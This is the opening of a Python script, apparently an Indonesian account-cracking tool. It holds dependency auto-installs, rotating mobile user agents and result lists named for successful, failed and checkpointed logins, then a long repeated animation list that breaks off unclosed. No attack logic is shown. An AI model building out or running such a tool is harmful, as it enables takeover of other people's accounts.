########################
# CODE BY print X NANO #
#   JEKO RAMADHAN :)   #
########################
import requests,bs4,json,os,sys,random,datetime,time,re,base64,subprocess,uuid
try:
	import requests
except ImportError as e:
	print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
	os.system(f"python -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
	os.system(f"python -m pip2 install {e.name} &> /dev/null")
try:
	import bs4
except ImportError as e:
	print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
	os.system(f"python -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
	os.system(f"python -m pip2 install {e.name} &> /dev/null")
try:
	import stdiomask
except ImportError as e:
	print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
	os.system(f"python -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
	os.system(f"python -m pip2 install {e.name} &> /dev/null")
try:
	import mechanize
except ImportError as e:
	print(f"[X] Sedang Install Bahan {e.name}, Mohon Bersabar....")
	os.system(f"python -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip install {e.name} &> /dev/null")
	os.system(f"python2 -m pip2 install {e.name} &> /dev/null")
	os.system(f"python -m pip2 install {e.name} &> /dev/null")
try:
	import gtts
except ImportError:
	os.system('pip install gtts')
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from rich import print as kui
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
import calendar
from time import sleep as jeda
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
import os,sys

# INDICATION
ses = requests.Session() 
data = {}
data2 = {}
apadong = []
old_gak = []
pass_tipe = []
berhasil = []
gagal = []
method = []
munculapk = []
save = [] 
gab,exp,data_licensi = [],[],{} 
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
id,id2,loop,ok,cp,akun,oprek = [],[],0,0,0,[],[]
os.system("clear")
animasi = ["[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", 